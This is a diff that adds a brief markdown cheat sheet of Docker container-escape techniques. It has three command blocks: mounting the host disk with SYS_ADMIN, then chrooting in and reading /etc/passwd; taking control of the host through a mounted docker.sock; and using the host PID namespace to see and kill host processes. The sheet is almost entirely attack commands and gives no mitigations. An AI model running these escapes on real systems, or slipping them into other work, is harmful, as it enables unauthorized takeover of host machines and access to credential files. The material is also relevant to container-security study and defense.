@@ -1,0 +1,30 @@
+
+Exploit Device Injection 
+
+   ```bash
+   docker run -it --rm --cap-add=SYS_ADMIN ubuntu /bin/bash
+   mkdir /mnt/host
+   mount /dev/sda1 /mnt/host
+   chroot /mnt/host
+   cat /etc/passwd
+   ```
+
+
+# Escape via Docker Socket
+
+```bash
+docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock ubuntu /bin/bash
+apt update && apt install -y docker.io
+docker ps
+# run a privileged pod or so
+```
+
+Host PID Namespace Access
+
+
+```bash
+docker run -it --rm --pid=host ubuntu /bin/bash
+ps -ef # already on the host you could kill processes from here
+```
+With `--pid=host`, the container shares the host’s PID namespace, enabling access to and control over host processes.
+
